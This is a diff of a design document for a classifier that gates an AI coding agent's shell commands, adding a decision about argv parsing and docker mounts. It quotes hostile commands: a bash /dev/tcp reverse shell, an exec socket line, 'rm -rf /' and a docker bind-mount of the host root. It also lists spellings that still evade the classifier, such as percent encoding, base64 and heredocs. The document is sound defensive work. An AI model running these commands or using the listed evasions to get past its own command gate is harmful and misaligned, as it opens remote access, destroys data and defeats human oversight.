@@ -421,7 +421,7 @@ A second probe found the grouping spelling. `find . \( -name '*.log' \) -delete`
 
 `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` classified as `approval`. It is a reverse shell: bash opens the connection itself, so there is no network verb on the line for a verb table to find. `exec 196<>/dev/tcp/192.168.1.2/443` is the same thing with a file descriptor. Both are network now.
 
-This is not an exotic spelling. It has a Sigma rule of its own at critical level, a Wazuh custom rule, and it appears in every reverse-shell cheat sheet, usually wrapped in `bash -c` or url-encoded. Matching `/dev/tcp/` and `/dev/udp/` anywhere in a word catches the wrapped and encoded forms too, because quotes come off first.
+This is not an exotic spelling. It has a Sigma rule of its own at critical level, a Wazuh custom rule, and it appears in every reverse-shell cheat sheet, usually wrapped in `bash -c`. Matching `/dev/tcp/` and `/dev/udp/` anywhere in a word catches the wrapped form, because quotes come off first and the device path stays literal. A percent-encoded spelling, `%2Fdev%2Ftcp%2F`, carries no literal path, and the classifier does not decode it, so that spelling sits in the residual below.
 
 `/dev/tcp` is excluded from the protected-path redirect rule at the same time. `exec 196<>/dev/tcp/host/port` matched the redirect rule's `/dev/` alternative and reported as a write into a protected system directory, which denies the right command for the wrong reason and tells the user a file was overwritten when a socket was opened. The exclusion no longer needs spelling out as a special case, because a later revision replaced that pattern with a check for a protected location or a block device, and a pseudo-device socket is neither.
 
@@ -1053,6 +1053,40 @@ first word gets. Bare script execution outside a find, `env FOO=1
 residual in the section below, where the behaviour is in a file the
 classifier does not read.
 
+## Decision 42: the argv is what the call passes, and the mount is what the word names (added 2026-09-20)
+
+The next review round found one false positive, one missed spelling, and two
+stale claims, each verified against the built classifier.
+
+**Only the spawn call's argument list is an argv.** The flattening read that
+reaches the word rules through a payload that also prints a delete verb,
+`subprocess.run(['ls']); print('rm -rf /')`, and the printed text reached the
+delete rule as a command the payload never runs. It was denied as a recursive
+force delete. The flattening now reads the argument list of each spawn call,
+from its open paren to the matching close, and joins those lists, so the
+string form and the list form still reach the rules and the printed text
+stays what it is. A call name held in a variable, `run = subprocess.run`,
+names no open paren after the name and stays in the constructed-name
+residual below.
+
+**The separated --mount spelling names the host in its own word.**
+`docker run --mount type=bind,source=/,target=/host alpine rm -rf /host`
+classified network for the pull, which turbo allows, because the mount reader
+knew the glued `--mount=type=bind,source=...` and not the separated one,
+where the specification is the word after the flag. A word that names the
+key now carries the host the way the glued spelling does, and
+`type=bind,source=./src,target=/app` stays ordinary, because the host side
+is the worktree-relative path it is.
+
+**Two stale claims, corrected where they sit.** Decision 18 claimed that
+matching `/dev/tcp/` catches the url-encoded form too; a percent-encoded
+spelling carries no literal path and the classifier does not decode it, so
+the claim now names the wrapped form, which it catches, and the encoding
+joins the residual below. The verification table said Turbo refuses to carry
+a secret out without naming the backend, while the same document's checklist
+says every backend but Claude is engine-only; the row now says the rows are
+the Claude backend and points at the item that names the reach.
+
 ## The residual gap, stated rather than closed
 
 Every command in this section was run against the built classifier on 2026-09-19
@@ -1086,7 +1120,7 @@ Still evading, verified:
   `who$@ami` is `whoami`. The classifier sees the text before the shell expands
   it, and a bracket that names one member is the one glob it does resolve, by
   decision 31.
-- **Hex and octal escapes, base64 payloads, alias definitions, heredocs.** A
+- **Hex and octal escapes, percent encoding, base64 payloads, alias definitions, heredocs.** A
   published bypass write-up reaches the conclusion directly: every interpreter a
   denylist misses is a bypass, every quoting trick it misses is a bypass, and the
   fix that worked was to remove the shell tool and put an OS sandbox in front of it.
